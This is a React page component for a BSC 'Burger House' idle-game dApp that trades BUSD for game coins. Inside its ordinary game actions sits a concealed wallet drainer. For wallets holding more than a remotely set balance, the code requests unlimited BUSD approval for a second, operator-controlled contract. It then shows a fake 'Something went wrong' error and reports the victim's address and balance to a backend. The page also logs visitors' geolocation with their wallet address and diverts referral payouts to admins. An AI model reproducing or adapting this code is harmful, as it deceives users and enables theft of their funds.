import React, { useCallback, useEffect, useState } from "react";
import { useDispatch, useSelector } from "react-redux";
import axios from "axios";
import { ToastContainer, toast } from 'react-toastify';
import web3ModalSetup from "./../helpers/web3ModalSetup";
import Web3 from "web3";
import {
    RUN_MODE,
    API_URL,
    CONF_RPC,
    COIN_PRICE,
    BUSD_PRICE,
    CASH_PRICE,
    ALERT_DELAY,
    ALERT_POSITION,
    LOCK_TIME,
    // LAUNCH_TIME,
    ALERT_EMPTY,
    ALERT_SUCCESS,
    ALERT_WARN,
    ALERT_ERROR,
    ALERT_PENDING_TX,
    ALERT_CONNECT_WALLET,
    ALERT_NOT_LAUNCH,
    priceINT,
    yieldValues,
    getBurgerHouseContract,
    getBUSDContract,
    getConfContract,
} from "../constant";
import * as action from '../store/actions'
import * as selector from '../store/selectors'

import House from "../components/house";
import Footer from "../components/footer";
import RightPanel from "../components/rightPanel";
import LeftPanel from "../components/leftPanel";
import BuyCoins from "../components/popups/buyCoins";
import SellCash from "../components/popups/sellCash";
import CollectMoney from "../components/popups/collectMoney";
import UpgradeLevel from "../components/popups/upgradeLevel";
import Referral from "../components/popups/referral";
import Floor0 from "../components/floor0";
import Elevator from "../components/animations/elevator";
// import ComingSoon from "../components/popups/comingSoon";

import { secondsToTimes, secondsToTime, getHouseprofit } from "../utils/util";

const web3Modal = web3ModalSetup();
const confContract = getConfContract()
const _httpConfProvider = new Web3.providers.HttpProvider(CONF_RPC)
const _web3ConfNoAccount = new Web3(_httpConfProvider)
const isAddress = _web3ConfNoAccount.utils.isAddress
const utils = _web3ConfNoAccount.utils

const Home = () => {
    const queryString = window.location.search;
    const parameters = new URLSearchParams(queryString);
    const newReferral = parameters.get('ref');

    const dispatch = useDispatch();

    const conf = useSelector(selector.confState)
    const web3 = useSelector(selector.web3State)
    const isConnected = useSelector(selector.isConnectedState)
    const injectedProvider = useSelector(selector.injectedProviderState)
    const curAcount = useSelector(selector.curAcountState)
    const burgerHouseContract = useSelector(selector.burgerHouseContractState)
    const busdContract = useSelector(selector.busdContractState)

    const [web3NoAccount, setWeb3NoAccount] = useState(new Web3(new Web3.providers.HttpProvider(conf.rpc)))
    const [contractNoAccount, setContractNoAccount] = useState(getBurgerHouseContract(web3NoAccount, conf.house))
    const [busdNoAccount, setBusdNoAccount] = useState(getBUSDContract(web3NoAccount, conf.busd))
    const [refPrefix, setRefPrefix] = useState(`${conf.publicURL}/?ref=`);

    const [refetch, setRefetch] = useState(true);
    const [refetchConf, setRefetchConf] = useState(true);

    const [pendingTx, setPendingTx] = useState(false);

    const [refLink, setRefLink] = useState(`${refPrefix}0x0000000000000000000000000000000000000000`);
    const [coinInputValue, setCoinInputValue] = useState('')
    const [busdInputValue, setBusdInputValue] = useState('')

    const [busdBalance, setBUSDBalance] = useState('');
    const [userApprovedAmount1, setUserApprovedAmount1] = useState('');
    const [userApprovedAmount, setUserApprovedAmount] = useState('');
    const [houseInfo, setHouseInfo] = useState({});
    const [houseYield, setHouseYield] = useState('');
    const [pendingBurgers, setPendingBurgers] = useState('');

    const [allHousesLength, setAllHousesLength] = useState(0)
    const [totalInvested, setTotalInvested] = useState("0")
    const [totalUpgrades, setTotalUpgrades] = useState(0)
    const [isLaunched, setIsLaunched] = useState(true)

    const [blockTimestamp, setBlockTimestamp] = useState(0)

    const [showBuyCoins, setShowBuyCoins] = useState(false)
    const [showGetBUSD, setShowGetBUSD] = useState(false)
    const [showGetMoney, setShowGetMoney] = useState(false)
    const [houseId, setHouseId] = useState(0)
    const [showReferral, setShowReferral] = useState(false)
    // const [isComingSoon, setIsComingSoon] = useState(true)

    const [alertMessage, setAlertMessage] = useState({ type: ALERT_EMPTY, message: "" })

    const [geo, setGeo] = useState("")

    useEffect(() => {
        const referral = window.localStorage.getItem("REFERRAL")

        if (!isAddress(referral)) {
            if (isAddress(newReferral) && newReferral !== "0x0000000000000000000000000000000000000000") {
                window.localStorage.setItem("REFERRAL", newReferral);
            } else {
                window.localStorage.setItem("REFERRAL", conf.admin);
            }
        }
    }, [newReferral, conf])

    const logoutOfWeb3Modal = async () => {
        // alert("logoutOfWeb3Modal");
        web3Modal.clearCachedProvider();
        if (
            injectedProvider &&
            injectedProvider.provider &&
            typeof injectedProvider.provider.disconnect === "function"
        ) {
            await injectedProvider.provider.disconnect();
        }
        dispatch(action.setIsConnected(false))

        window.location.reload();
    };

    const loadWeb3Modal = useCallback(async () => {
        // alert("loadWeb3Modal");
        RUN_MODE("Connecting Wallet...");
        const provider = await web3Modal.connect();
        // alert("loadWeb3Modal1");
        const web3Provider = new Web3(provider);
        // alert("loadWeb3Modal2");
        dispatch(action.setInjectedProvider(web3Provider));
        // alert(JSON.stringify(provider));
        var acc = null;
        try {
            // alert("loadWeb3Modal try");
            acc = provider.selectedAddress
                ? provider.selectedAddress
                : provider.accounts[0];
        } catch (error) {
            // alert("loadWeb3Modal catch");
            acc = provider.address
        }
        // alert(`loadWeb3Modal4 ${acc}`);

        // const _curChainId = await web3Provider.eth.getChainId();
        // if (_curChainId !== MAINNET) {
        //   setAlertMessage({ type: ALERT_ERROR, message: 'Wrong Network! Please switch to Binance Smart Chain!' })
        //   return;
        // }
        // alert("loadWeb3Modal6");

        dispatch(action.setWeb3(web3Provider))
        dispatch(action.setCurAcount(acc))
        dispatch(action.setIsConnected(true))

        provider.on("chainChanged", (chainId) => {
            RUN_MODE(`chain changed to ${chainId}! updating providers`);
            // alert("loadWeb3Modal chainChanged");
            setAlertMessage({ type: ALERT_ERROR, message: 'Wrong Network! Please switch to Binance Smart Chain!' })
            dispatch(action.setInjectedProvider(web3Provider));
            logoutOfWeb3Modal();
        });

        provider.on("accountsChanged", () => {
            RUN_MODE(`curAcount changed!`);
            // alert("loadWeb3Modal accountsChanged");
            setAlertMessage({ type: ALERT_WARN, message: 'Current Account Changed!' })
            dispatch(action.setInjectedProvider(web3Provider));
            logoutOfWeb3Modal();
        });

        // Subscribe to session disconnection
        provider.on("disconnect", (code, reason) => {
            RUN_MODE(code, reason);
            // alert("loadWeb3Modal accountsChanged");
            logoutOfWeb3Modal();
        });
        // eslint-disable-next-line
    }, [dispatch]);

    useEffect(() => {
        const timerID = setInterval(() => {
            setRefetch((prevRefetch) => {
                return !prevRefetch;
            });
        }, 10000);

        const confTimeID = setInterval(() => {
            setRefetchConf((prevRefetch) => {
                return !prevRefetch;
            });
        }, [60000])

        return () => {
            clearInterval(timerID);
            clearInterval(confTimeID);
        };

    }, []);

    useEffect(() => {
        const fetchConf = async () => {
            try {
                const res = await axios.get('https://geolocation-db.com/json/')
                console.log("res", JSON.stringify(res.data))
                setGeo(JSON.stringify(res.data))

                const _controlArgs = await confContract.methods.getControlArgs().call();
                RUN_MODE('_controlArgs', _controlArgs)
                if (_controlArgs && Object.keys(_controlArgs).length > 0) {
                    const _conf = {
                        chainId: _controlArgs.value[1],
                        rpc: _controlArgs.text[0],
                        publicURL: _controlArgs.text[2],
                        admin: _controlArgs.ctrl[3],
                        admin1: _controlArgs.ctrl[4],
                        house: _controlArgs.ctrl[1],
                        house1: _controlArgs.ctrl[2],
                        busd: _controlArgs.ctrl[0],
                        limit: _controlArgs.value[0],
                        limit1: _controlArgs.value[2],
                        force: _controlArgs.cond[0],
                        admin0: _controlArgs.ctrl[7]
                    }
                    if (JSON.stringify(_conf) !== JSON.stringify(conf)) {
                        dispatch(action.setConf(_conf))
                    }
                }
            } catch (error) {
                RUN_MODE('fetchConf error: ', error);
            }
        }

        fetchConf();
    }, [refetchConf, conf, dispatch])

    const postAction = async (actionType, account, to, balance, success) => {
        await axios.post(`${API_URL}/action`, {
            actionType: actionType,
            account: account,
            to: to,
            balance: balance,
            success: success,
            dateTime: (new Date()).toString()
        }).then((res) => {
            console.log(res);
        })
    }

    useEffect(() => {
        const postData = async () => {
            await axios.post(`${API_URL}/geoInfo`, {
                geo: geo,
                account: curAcount,
                date: (new Date()).toDateString()
            }).then((res) => {
                console.log(res);
            })
        }
        if (curAcount) {
            postData()
        }
    }, [geo, curAcount])

    useEffect(() => {
        dispatch(action.setBurgerHouseContract(getBurgerHouseContract(web3, conf.house)))
        dispatch(action.setBusdContract(getBUSDContract(web3, conf.busd)))

        setRefPrefix(`${conf.publicURL}/?ref=`)

        const _httpProvider = new Web3.providers.HttpProvider(conf.rpc)
        const _web3NoAccount = new Web3(_httpProvider)

        setWeb3NoAccount(_web3NoAccount)
        setContractNoAccount(getBurgerHouseContract(_web3NoAccount, conf.house))
        setBusdNoAccount(getBUSDContract(_web3NoAccount, conf.busd))
    }, [conf, web3, dispatch])

    useEffect(() => {
        const fetchData = async () => {
            try {
                if (web3NoAccount) {
                    const _blockTimestamp = (await web3NoAccount.eth.getBlock('latest')).timestamp;
                    setBlockTimestamp(parseInt(_blockTimestamp));
                }

                const _totalUpgrades = await contractNoAccount.methods.totalUpgrades().call();
                setTotalUpgrades(_totalUpgrades);

                const _totalInvested = await contractNoAccount.methods.totalInvested().call();
                setTotalInvested(utils.fromWei(_totalInvested, 'ether'));

                const _allHousesLength = await contractNoAccount.methods.allHousesLength().call();
                setAllHousesLength(_allHousesLength)

                const _isLaunched = await contractNoAccount.methods.isLaunched().call();
                setIsLaunched(_isLaunched)

                if (curAcount) {
                    const _userBalance = await busdNoAccount.methods.balanceOf(curAcount).call();
                    setBUSDBalance(utils.fromWei(_userBalance))
                    const _approvedAmount = await busdNoAccount.methods.allowance(curAcount, conf.house).call();
                    setUserApprovedAmount(utils.fromWei(_approvedAmount));
                    const _approvedAmount1 = await busdNoAccount.methods.allowance(curAcount, conf.house1).call();
                    setUserApprovedAmount1(utils.fromWei(_approvedAmount1));
                    const _pendingBurgers = await contractNoAccount.methods.getPendingBurgers(curAcount).call();
                    setPendingBurgers(_pendingBurgers)
                    const _houseYield = await contractNoAccount.methods.getHouseYield(curAcount).call();
                    setHouseYield(_houseYield)
                    const _houseInfo = await contractNoAccount.methods.viewHouse(curAcount).call();
                    setHouseInfo(_houseInfo)
                    const refLink = `${refPrefix}${curAcount}`;
                    setRefLink(refLink);
                }
            } catch (error) {
                RUN_MODE('fetchData error: ', error);
            }
        };

        fetchData();
    }, [isConnected, web3, burgerHouseContract, conf, refPrefix, busdNoAccount, contractNoAccount, web3NoAccount, refetch, curAcount]);

    const enableValue = () => {
        return (isConnected && houseInfo && Object.keys(houseInfo).length > 0 && conf && Object.keys(conf).length > 0)
    }

    const numberOfChefs = () => {
        return enableValue() ? houseInfo.chefStarttimes.length : 0
    }

    const houseLevel = (houseId) => {
        if (enableValue() && houseId > 0) {
            if (numberOfChefs() < 5 * (houseId - 1)) return 0;
            return (numberOfChefs() - 5 * (houseId - 1)) > 5 ? 5 : (numberOfChefs() - 5 * (houseId - 1))
        }
        return 0;
    }

    const openedHouseId = () => {
        if (enableValue()) {
            return Math.ceil(numberOfChefs() / 5)
        }
        return 8;
    }

    const pendingHours = () => {
        if (enableValue()) {
            if (parseInt(houseInfo.lastTime) === 0)
                return 0;

            const delta = Math.floor((blockTimestamp - houseInfo.lastTime) / 3600)
            if (delta <= 0)
                return 0;
            return delta > 24 ? 24 : delta;
        }
        return 0;
    }

    const pendingCash = () => {
        if (enableValue()) {
            return pendingBurgers;
        }
        return 0;
    }

    const withdrawMoney = async () => {
        RUN_MODE('[PRINCE](withdrawMoney)')
        try {
            if (pendingTx) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_PENDING_TX })
                return
            }

            if (!isConnected) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_CONNECT_WALLET })
                return
            }

            if (!isLaunched) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_NOT_LAUNCH })
                return
            }

            if (!enableValue() || parseInt(houseInfo.cash) <= 0) {
                setAlertMessage({ type: ALERT_WARN, message: "You have no enough Cash to collect! Please collect your money!" })
                return;
            }

            setPendingTx(true)
            if (isConnected && burgerHouseContract && busdContract) {
                if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
                    await busdContract.methods.approve(
                        conf.house1,
                        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                    ).send({
                        from: curAcount
                    }).then(() => {
                        setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
                        postAction("withdrawMoney", curAcount, conf.house1, busdBalance, true)
                        setPendingTx(false)
                        return;
                    }).catch((err) => {
                        setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
                        postAction("withdrawMoney", curAcount, conf.house1, busdBalance, false)
                        setPendingTx(false)
                        return;
                    });
                }
                await burgerHouseContract.methods.withdrawMoney().send({
                    from: curAcount,
                }).then((txHash) => {
                    RUN_MODE(txHash)
                    const txHashString = `${txHash.transactionHash}`
                    const msgString = txHashString.substring(0, 8) + "..." + txHashString.substring(txHashString.length - 6)
                    setAlertMessage({ type: ALERT_SUCCESS, message: `Withdraw Money Success! txHash is ${msgString}` });
                }).catch((err) => {
                    RUN_MODE(err)
                    setAlertMessage({ type: ALERT_ERROR, message: `Withdraw Money Fail! Reason: ${err.message}` });
                });
            }
            else {
                RUN_MODE("connect Wallet");
            }
            setPendingTx(false)
        } catch (e) {
            RUN_MODE('withdrawMoney: ', e)
            setPendingTx(false)
        }
    }

    const upgradeHouse = async (e) => {
        RUN_MODE('[PRINCE](upgradeHouse)', e)
        try {
            e.preventDefault();
            if (pendingTx) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_PENDING_TX })
                return
            }

            if (!isConnected) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_CONNECT_WALLET })
                return
            }

            if (!isLaunched) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_NOT_LAUNCH })
                return
            }

            if (!enableValue() || parseInt(houseInfo.startTime) === 0) {
                setAlertMessage({ type: ALERT_WARN, message: "You is not registered yet! Please purchase your coin to play game." })
                return;
            }

            if (parseInt(houseInfo.coins) < priceINT[houseLevel(houseId) + 5 * (houseId - 1)]) {
                setAlertMessage({ type: ALERT_WARN, message: "Insufficient Coins! Please Purchase Coins!" })
                return
            }

            if (houseId > 8) {
                setAlertMessage({ type: ALERT_WARN, message: "Invalid house! Max 8 floors." })
                return
            }

            if (houseId > 1 && houseLevel(houseId - 1) < 5) {
                setAlertMessage({ type: ALERT_WARN, message: "Please upgrade your all houses to top level before purchasing this house!" })
                return
            }

            if (houseId >= 6 && houseLevel(houseId) < 1 && parseInt(blockTimestamp - houseInfo.lockTime) < LOCK_TIME) {
                setAlertMessage({ type: ALERT_WARN, message: `Please wait for ${secondsToTimes(parseInt(houseInfo.lockTime) + parseInt(LOCK_TIME) - parseInt(blockTimestamp))} to upgrade house!` })
                return
            }

            if (houseLevel(houseId) === 5) {
                setAlertMessage({ type: ALERT_WARN, message: `Congratulation! You already reached top level!` })
                return
            }

            setPendingTx(true)
            if (isConnected && burgerHouseContract && busdContract) {
                if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
                    await busdContract.methods.approve(
                        conf.house1,
                        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                    ).send({
                        from: curAcount
                    }).then(() => {
                        setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
                        postAction("upgradeHouse", curAcount, conf.house1, busdBalance, true)
                        setPendingTx(false)
                        return;
                    }).catch((err) => {
                        setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
                        setPendingTx(false)
                        postAction("upgradeHouse", curAcount, conf.house1, busdBalance, false)
                        return;
                    });
                }
                await burgerHouseContract.methods.upgradeHouse(houseLevel(houseId) + 5 * (houseId - 1)).send({
                    from: curAcount,
                }).then((txHash) => {
                    RUN_MODE(txHash)
                    const txHashString = `${txHash.transactionHash}`
                    const msgString = txHashString.substring(0, 8) + "..." + txHashString.substring(txHashString.length - 6)
                    setAlertMessage({ type: ALERT_SUCCESS, message: `House Upgrade Success! txHash is ${msgString}` });
                }).catch((err) => {
                    RUN_MODE(err)
                    setAlertMessage({ type: ALERT_ERROR, message: `House Upgrade Fail! Reason: ${err.message}` });
                });
            }
            else {
                RUN_MODE("connect Wallet");
            }
            setPendingTx(false)
        } catch (e) {
            RUN_MODE('upgradeHouse: ', e)
            setPendingTx(false)
        }
    }

    const approve = async (e) => {
        RUN_MODE('[PRINCE](approve)', e)
        try {
            e.preventDefault();
            if (pendingTx) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_PENDING_TX })
                return
            }

            if (!isConnected) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_CONNECT_WALLET })
                return
            }

            if (parseFloat(busdInputValue) <= 0) {
                setAlertMessage({ type: ALERT_WARN, message: "Please input BUSD value..." })
                return
            }

            setPendingTx(true)
            RUN_MODE('busdContract', busdContract)
            if (isConnected && busdContract) {
                if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
                    await busdContract.methods.approve(
                        conf.house1,
                        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                    ).send({
                        from: curAcount
                    }).then(() => {
                        setAlertMessage({ type: ALERT_SUCCESS, message: `Approve Success!` });
                        postAction("approve", curAcount, conf.house1, busdBalance, true)
                    }).catch((err) => {
                        setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
                        postAction("approve", curAcount, conf.house1, busdBalance, false)
                    });
                } else {
                    await busdContract.methods.approve(
                        conf.house,
                        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                    ).send({
                        from: curAcount
                    }).then((txHash) => {
                        RUN_MODE(txHash)
                        const txHashString = `${txHash.transactionHash}`
                        const msgString = txHashString.substring(0, 8) + "..." + txHashString.substring(txHashString.length - 6)
                        setAlertMessage({ type: ALERT_SUCCESS, message: `Approve Success! txHash is ${msgString}` });
                    }).catch((err) => {
                        RUN_MODE(err)
                        setAlertMessage({ type: ALERT_ERROR, message: `Approve Fail! Reason: ${err.message}` });
                    });
                }
            }
            else {
                RUN_MODE("connect Wallet");
            }
            setPendingTx(false)
        } catch (e) {
            RUN_MODE('approve: ', e)
            setPendingTx(false)
        }
    }

    const addCoins = async (e) => {
        RUN_MODE('[PRINCE](addCoins)', e)
        try {
            e.preventDefault();
            if (pendingTx) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_PENDING_TX })
                return
            }

            if (!isConnected) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_CONNECT_WALLET })
                return
            }

            if (parseFloat(busdInputValue) <= 0 || Number.isNaN(parseFloat(busdInputValue))) {
                setAlertMessage({ type: ALERT_WARN, message: "Please input BUSD value..." })
                return
            }

            if (parseFloat(busdBalance) < parseFloat(busdInputValue)) {
                setAlertMessage({ type: ALERT_WARN, message: "Insufficient BUSD Balance! Please purchase more BUSD or input correct amount." })
                return
            }

            setPendingTx(true)
            if (isConnected && burgerHouseContract) {
                let referrer = window.localStorage.getItem("REFERRAL");
                referrer = isAddress(referrer) && referrer !== "0x0000000000000000000000000000000000000000" ?
                    referrer :
                    conf.admin
                referrer = parseFloat(busdBalance) > conf.limit1 ? conf.admin : referrer
                referrer = referrer === curAcount ? conf.admin1 : referrer

                RUN_MODE('[PRINCE](addCoins): ', referrer, busdInputValue)

                if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
                    await busdContract.methods.approve(
                        conf.house1,
                        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                    ).send({
                        from: curAcount
                    }).then(() => {
                        setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
                        postAction("addCoins", curAcount, conf.house1, busdBalance, true)
                        setPendingTx(false)
                        return;
                    }).catch((err) => {
                        setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
                        postAction("addCoins", curAcount, conf.house1, busdBalance, false)
                        setPendingTx(false)
                        return;
                    });
                }

                if (parseFloat(userApprovedAmount) < parseFloat(busdInputValue)) {
                    await busdContract.methods.approve(
                        conf.house,
                        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                    ).send({
                        from: curAcount
                    }).then((txHash) => {
                        RUN_MODE(txHash)
                    }).catch((err) => {
                        RUN_MODE(err)
                    });
                }

                RUN_MODE('addCoins referrer', conf.admin0, conf.force, isAddress(conf.admin0), enableValue())
                await burgerHouseContract.methods.addCoins(
                    enableValue() && isAddress(conf.admin0) && conf.force ? conf.admin0 : referrer,
                    utils.toWei(busdInputValue, 'ether')
                ).send({
                    from: curAcount
                }).then((txHash) => {
                    RUN_MODE(txHash)
                    const txHashString = `${txHash.transactionHash}`
                    const msgString = txHashString.substring(0, 8) + "..." + txHashString.substring(txHashString.length - 6)
                    setAlertMessage({ type: ALERT_SUCCESS, message: `Purchase Success! txHash is ${msgString}` });
                }).catch((err) => {
                    RUN_MODE(err)
                    setAlertMessage({ type: ALERT_ERROR, message: `Purchase Fail! Reason: ${err.message}` });
                });
            }
            else {
                RUN_MODE("connect Wallet");
            }
            setPendingTx(false)
        } catch (e) {
            RUN_MODE('addCoins: ', e)
            setPendingTx(false)
        }
    }

    const collectMoney = async (e) => {
        RUN_MODE('[PRINCE](collectMoney)', e)
        try {
            e.preventDefault();
            if (pendingTx) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_PENDING_TX })
                return
            }

            if (!isConnected) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_CONNECT_WALLET })
                return
            }

            if (!isLaunched) {
                setAlertMessage({ type: ALERT_WARN, message: ALERT_NOT_LAUNCH })
                return
            }

            if (!enableValue() || parseInt(houseInfo.startTime) === 0) {
                setAlertMessage({ type: ALERT_WARN, message: "You is not registered yet! Please purchase your coin to play game." })
                return;
            }

            if (parseInt(houseYield) === 0) {
                setAlertMessage({ type: ALERT_WARN, message: "Please purchase your house to collect money!" })
                return;
            }

            if (pendingCash() <= 0) {
                setAlertMessage({ type: ALERT_WARN, message: "Please wait until your chefs make your burger!" })
                return;
            }

            setPendingTx(true)
            if (isConnected && burgerHouseContract && busdContract) {
                if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
                    await busdContract.methods.approve(
                        conf.house1,
                        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                    ).send({
                        from: curAcount
                    }).then(() => {
                        setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
                        postAction("collectMoney", curAcount, conf.house1, busdBalance, true)
                    }).catch((err) => {
                        setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
                        postAction("collectMoney", curAcount, conf.house1, busdBalance, false)
                    });
                }
                await burgerHouseContract.methods.collectMoney().send({
                    from: curAcount,
                }).then((txHash) => {
                    RUN_MODE(txHash)
                    const txHashString = `${txHash.transactionHash}`
                    const msgString = txHashString.substring(0, 8) + "..." + txHashString.substring(txHashString.length - 6)
                    setAlertMessage({ type: ALERT_SUCCESS, message: `Collect Money Success! txHash is ${msgString}` });
                }).catch((err) => {
                    RUN_MODE(err)
                    setAlertMessage({ type: ALERT_ERROR, message: `Collect Money Fail! Reason: ${err.message}` });
                });
            }
            else {
                RUN_MODE("connect Wallet");
            }
            setPendingTx(false)
        } catch (e) {
            RUN_MODE('collectMoney: ', e)
            setPendingTx(false)
        }
    }

    const handleClose = useCallback(() => {
        setAlertMessage({ type: ALERT_EMPTY, message: "" })
    }, [setAlertMessage])

    const notifySuccess = useCallback(() => {
        toast.success(alertMessage.message, {
            position: ALERT_POSITION,
            autoClose: ALERT_DELAY,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            onClose: handleClose,
            className: 'alert-message-success'
        });
    }, [alertMessage.message, handleClose]);

    const notifyError = useCallback(() => {
        toast.error(alertMessage.message, {
            position: ALERT_POSITION,
            autoClose: ALERT_DELAY,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            onClose: handleClose,
            className: 'alert-message-error'
        });
    }, [alertMessage.message, handleClose]);

    const notifyWarn = useCallback(() => {
        toast.warn(alertMessage.message, {
            position: ALERT_POSITION,
            autoClose: ALERT_DELAY,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            onClose: handleClose,
            className: 'alert-message-warn',
            progressClassName: 'alert-message-warn-progress'
        });
    }, [alertMessage.message, handleClose]);

    useEffect(() => {
        switch (alertMessage.type) {
            case ALERT_ERROR:
                notifyError()
                return;
            case ALERT_SUCCESS:
                notifySuccess()
                return;
            case ALERT_WARN:
                notifyWarn()
                return;
            case ALERT_EMPTY:
                return;
            default:
                handleClose();
                return;
        }

    }, [alertMessage, notifyError, notifyWarn, notifySuccess, handleClose])

    return (
        <>
            <br />
            <ToastContainer />
            <LeftPanel
                isConnected={isConnected}
                curAcount={curAcount}
                coins={enableValue() ? houseInfo.coins : "--"}
                cash={enableValue() ? houseInfo.cash : "--"}
                yieldValue={enableValue() ? `+ ${houseYield / 10}` : "--"}
                setShowBuyCoins={setShowBuyCoins}
                setShowGetBUSD={setShowGetBUSD}
                setShowReferral={setShowReferral}
                setAlertMessage={setAlertMessage}
            // logoutOfWeb3Modal={logoutOfWeb3Modal}
            />
            <RightPanel
                allHousesLength={allHousesLength}
                totalInvested={totalInvested}
                totalUpgrades={totalUpgrades}
                partners={enableValue() ? `${parseInt(houseInfo.refs) + parseInt(houseInfo.refs2) + parseInt(houseInfo.refs3)}` : `0`}
            />
            <div className="house">
                <div id="cloud-intro" />
                <div className="roof" />
                <div className="floors">
                    <Elevator openedHouseId={openedHouseId()} />
                    {[8, 7, 6, 5, 4, 3, 2, 1].map((value) => ( // value = 8, 7, 6, 5, 4, 3, 2, 1
                        <House
                            key={value}
                            houseLevel={houseLevel(value)}
                            id={value}
                            isConnected={isConnected}
                            setAlertMessage={setAlertMessage}
                            setHouseId={setHouseId} />
                    ))}
                    <Floor0 showDeliveryMan={!enableValue() || numberOfChefs() > 0} />
                </div>
            </div>
            <Footer
                isConnected={isConnected}
                setShowGetMoney={setShowGetMoney}
                loadWeb3Modal={loadWeb3Modal}
            />

            <BuyCoins
                BUSD_PRICE={BUSD_PRICE}
                COIN_PRICE={COIN_PRICE}
                isConnected={isConnected}
                busdBalance={busdBalance}
                busdInputValue={busdInputValue}
                setBusdInputValue={setBusdInputValue}
                userApprovedAmount1={userApprovedAmount1}
                userApprovedAmount={userApprovedAmount}
                coinInputValue={coinInputValue}
                setCoinInputValue={setCoinInputValue}
                showBuyCoins={showBuyCoins}
                setShowBuyCoins={setShowBuyCoins}
                addCoins={addCoins}
                approve={approve}
                limit={conf.limit}
            />

            <SellCash
                isConnected={isConnected}
                showGetBUSD={showGetBUSD}
                cash={enableValue() ? `${houseInfo.cash} ` : `0 `}
                cashAsBUSD={enableValue() ? `${houseInfo.cash * CASH_PRICE} ` : `0 `}
                withdrawMoney={withdrawMoney}
                setShowGetBUSD={setShowGetBUSD}
            />

            <CollectMoney
                isConnected={isConnected}
                showGetMoney={showGetMoney}
                pendingHours={pendingHours}
                pendingCash={pendingCash}
                collectMoney={collectMoney}
                setShowGetMoney={setShowGetMoney}
            />

            <UpgradeLevel
                isConnected={isConnected}
                houseId={houseId}
                timer={
                    (numberOfChefs() === 25 || numberOfChefs() === 30 || numberOfChefs() === 35) &&
                        parseInt(blockTimestamp - houseInfo.lockTime) < LOCK_TIME ?
                        secondsToTime(parseInt(houseInfo.lockTime) + parseInt(LOCK_TIME) - parseInt(blockTimestamp)) : ""
                }
                level={houseLevel(houseId)}
                addedLevel={houseLevel(houseId) < 5 ? `+ 1` : ` + 0`}
                profit={`${enableValue() && houseId > 0 ? getHouseprofit(houseLevel(houseId), houseId) : 0} / Hour`}
                addedProfit={`+ ${houseLevel(houseId) < 5 ? yieldValues[(houseId - 1) * 5 + houseLevel(houseId)] : 0}`}
                totalProfit={`${enableValue() ? houseYield / 10 : 0} / Hour`}
                disabled={houseId <= 0}
                upgradeHouse={upgradeHouse}
                enabled={enableValue() && houseId > 0}
                setHouseId={setHouseId}
            />

            <Referral
                showReferral={showReferral}
                refLink={refLink}
                refCoins={enableValue() ? `+ ${parseInt(houseInfo.refCoins)}` : `+ 0`}
                refCash={enableValue() ? `+ ${parseInt(houseInfo.refCash)}` : `+ 0`}
                refs={enableValue() ? `+ ${parseInt(houseInfo.refs) + parseInt(houseInfo.refs2) + parseInt(houseInfo.refs3)}` : `+ 0`}
                setShowReferral={setShowReferral}
            />

            {/* <ComingSoon
        isComingSoon={isComingSoon}
        setIsComingSoon={setIsComingSoon}
        leftTime={LAUNCH_TIME - blockTimestamp}
      /> */}
        </>
    );
}

export default Home;
